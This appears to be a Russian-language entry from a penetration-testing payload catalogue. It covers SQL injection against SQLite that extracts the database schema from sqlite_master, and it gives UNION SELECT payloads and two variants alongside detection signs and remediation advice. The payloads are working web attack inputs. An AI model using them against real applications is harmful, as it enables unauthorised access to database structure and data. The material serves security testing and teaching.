---
id: sqli-sqlite-json-extract
title: "SQLite: извлечение схемы через sqlite_master"
type: sqli
target: sqlite
category: web
difficulty: beginner
bypass: none
tags: [sqli, sqlite, recon]
tested_on: ["SQLite 3.40"]
success_rate: 0.85
risk: medium
cwe: "CWE-89"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/SQL_Injection"
  - "https://portswigger.net/web-security/sql-injection"
graph:
  - target: "sqli"
    type: instance_of
---

# SQLite: извлечение схемы через sqlite_master

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
' UNION SELECT name, sql, 3 FROM sqlite_master --
```

## Explanation

SQLite хранит DDL всех объектов в системной таблице `sqlite_master`
(колонка `sql` — полный текст `CREATE TABLE`). Одного запроса достаточно, чтобы
восстановить всю схему. В мобильных приложениях и embedded-сервисах это частая находка:
у SQLite нет пользователей и прав — доступно всё.

## Detection

Признаки SQLite: ошибки `near ",": syntax error`, `no such column`, отсутствие
типизации, файлы `*.db`/`*.sqlite` в артефактах.

## Remediation

- Параметризованные запросы (в SQLite — placeholders `?`).
- Шифрование БД (SQLCipher) для чувствительных данных.
- Не хранить секреты в локальной БД клиента.

## Variants

```
' UNION SELECT sqlite_version(),2,3 --
```

```
' UNION SELECT group_concat(name),2,3 FROM sqlite_master WHERE type='table' --
```
